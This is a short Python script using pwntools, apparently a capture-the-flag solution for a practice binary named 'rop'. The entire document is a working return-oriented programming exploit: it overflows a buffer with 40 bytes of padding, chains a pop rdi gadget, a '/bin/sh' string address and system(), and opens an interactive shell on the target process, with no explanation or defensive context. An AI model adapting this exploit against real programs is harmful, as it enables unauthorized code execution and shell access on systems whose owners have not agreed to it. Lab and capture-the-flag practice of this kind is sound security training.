
# ROP

```py
#!/usr/bin/python3

from pwn import *

elf = context.binary = ELF('./rop')

io = process()

pop_rdi = 0x0000000000401313

bin_sh = 0x404060

system = elf.sym.system

ret = 0x000000000040101a

payload = cyclic(40) + pack(pop_rdi) + pack(bin_sh) + pack(ret) +pack(system)

io.sendline(payload)

io.interactive()
```
